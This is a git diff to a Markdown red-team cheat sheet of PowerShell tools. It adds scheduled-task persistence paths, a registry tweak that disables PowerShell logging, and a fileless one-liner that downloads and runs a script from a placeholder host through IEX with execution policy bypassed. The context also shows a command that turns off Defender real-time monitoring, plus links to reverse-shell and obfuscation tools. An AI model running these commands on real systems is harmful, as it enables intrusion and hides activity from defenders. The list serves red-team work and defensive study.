@@ -67,14 +67,26 @@ Set-MpPreference -DisableRealtimeMonitoring $true
   - [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
   - [SharpView](https://github.com/tevora-threat/SharpView) - C# implementation of harmj0y's PowerView.
 
+## Persistence
+- Task schedule standard storing paths
+````powershell
+C:\Windows\System32\Tasks
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree
+````
+
 ## Network
 - [Get-WlanEnterprisePassword](https://0x00-0x00.github.io/research/2018/11/06/Recovering-Plaintext-Domain-Credentials-From-WPA2-Enterprise-on-a-compromised-host.html)
 - [Invoke-SocksProxy](https://github.com/p3nt4/Invoke-SocksProxy) - Socks proxy, and reverse socks server using powershell.
-
-### Reverse-shell
-- [PowerShell-reverse-shell](https://github.com/MartinSohn/PowerShell-reverse-shell) - Reverse TCP shell in PowerShell for fun. Made in spring 2020 with inspiration from (and a few fixes to) samratashok/nishang Invoke-PowerShellTcp.ps1 and https://cyberwardog.blogspot.com/2016/08/poweshell-encrypt-tcp-client-server.html .
+- Reverse-shell
+  - [PowerShell-reverse-shell](https://github.com/MartinSohn/PowerShell-reverse-shell) - Reverse TCP shell in PowerShell for fun. Made in spring 2020 with inspiration from (and a few fixes to) samratashok/nishang Invoke-PowerShellTcp.ps1 and https://cyberwardog.blogspot.com/2016/08/poweshell-encrypt-tcp-client-server.html .
 
 ## Obfuscation, evaision and stealth
+- Disable powershell logging by set value to `0` in `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription`
+- File less attacks
+````powershell
+powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious-script')"
+````
 - [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) - Cmd.exe Command Obfuscation Generator & Detection Test Harness.
 - [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) - PowerShell Obfuscator.
 - [NoPowerShell](https://github.com/bitsadmin/nopowershell) - PowerShell rebuilt in C# for Red Teaming purposes 
